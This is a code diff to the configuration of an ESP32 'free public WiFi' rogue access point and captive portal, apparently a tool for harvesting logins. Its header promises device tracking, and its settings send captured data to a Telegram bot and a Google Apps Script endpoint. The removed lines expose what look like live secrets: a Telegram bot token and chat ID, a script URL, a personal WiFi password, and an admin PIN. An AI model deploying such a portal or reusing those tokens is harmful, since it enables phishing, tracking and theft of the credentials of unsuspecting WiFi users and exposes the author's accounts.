@@ -1,10 +1,10 @@
 /*
- * J.A.R.V.I.S. WiFi Portal System v6.5
- * ====================================
+ * Nexus WiFi Portal System v1.0
+ * =============================
  * 
  * Developed by: Muhammad Javed Hussain
- * Release Date: 6 August 2025
- * GitHub Repository: github.com/jvdhussain026/JARVIS-Captive-Portal
+ * Release Date: 12 August 2025
+ * GitHub Repository: github.com/jvdhussain026/nexus-wifi-portal
  * 
  * License: Apache 2.0
  *   - You are free to use, modify, and distribute this software
@@ -20,7 +20,7 @@
  * - Advanced captive portal system
  * - Device fingerprinting and tracking
  * - Real-time monitoring via WebSocket
- * - Telegram/Google Sheets integration
+ * - Telegram/Google Sheets integration (optional)
  * - Admin security lockout system
  * 
  * Special Thanks:
@@ -32,11 +32,6 @@
  * This tool demonstrates security vulnerabilities that exist in public WiFi systems.
  * Always obtain written permission before testing on any network.
  */
-
-
-
-
-
 
 #include <WiFi.h>
 #include <DNSServer.h>
@@ -71,31 +66,31 @@ bool isDeviceAuthenticated(String mac);
 // CONFIGURATION SECTION
 // =====================
 // Rogue Access Point Settings
-const char* rogueSSID = "Free_Public_WiFi";
-const char* roguePassword = "";
+const char* rogueSSID = "FREE_PUBLIC_WIFI";  // Change to your desired AP name
+const char* roguePassword = "";              // Open network
 const IPAddress apIP(192, 168, 4, 1);
 const byte DNS_PORT = 53;
 
-// Real Wi-Fi Credentials
-const char* realSSID = "Javed's 5g Network";
-const char* realPassword = "26062008";
+// Real Wi-Fi Credentials (For internet access)
+const char* realSSID = "YOUR_REAL_WIFI_SSID";     // Change to your actual WiFi
+const char* realPassword = "YOUR_REAL_WIFI_PASS"; // Change to your actual password
 
-// Google Forms Endpoint
-const char* googleScriptUrl = "https://script.google.com/macros/s/AKfycbzrdlPwfTaEFgA8iMkc03bBnIk7U-TOJl1x2RCtWIEfZKvE2z8tsAyzCqo3LK9X3hd7/exec";
+// Google Forms Endpoint (OPTIONAL)
+const char* googleScriptUrl = "YOUR_GOOGLE_SCRIPT_URL";  // Set up Google Apps Script first
 
-// Telegram Bot Settings
-const char* telegramBotToken = "8440454787:AAEQxl4qCP01HtKdzabCHiBLR2wj6HqSHQ0";
-const char* telegramChatID = "7725417769";
+// Telegram Bot Settings (OPTIONAL)
+const char* telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";  // Create via BotFather
+const char* telegramChatID = "YOUR_TELEGRAM_CHAT_ID";      // Get from @userinfobot
 
 // Admin Panel Settings
-const char *adminPin = "26062008";
+const char *adminPin = "nexus";          // CHANGE THIS TO YOUR SECURE PIN
 const int MAX_ADMIN_ATTEMPTS = 5;
 const unsigned long LOCKOUT_TIME = 300000; // 5 minutes
 
 // System Settings
 const bool ENABLE_SERIAL_MONITOR = true;
-const bool ENABLE_TELEGRAM = true;
-const bool ENABLE_GOOGLE_SHEETS = true;
+const bool ENABLE_TELEGRAM = false;       // Set true after configuring Telegram
+const bool ENABLE_GOOGLE_SHEETS = false;  // Set true after configuring Google Sheets
 const bool ENABLE_ADMIN_PANEL = true;
 const bool ENABLE_DEVICE_TRACKING = true;
 const int MAX_LOGINS = 100;
@@ -2267,3 +2262,4 @@ void loop() {
   esp_task_wdt_reset();
   delay(10);
 }
+
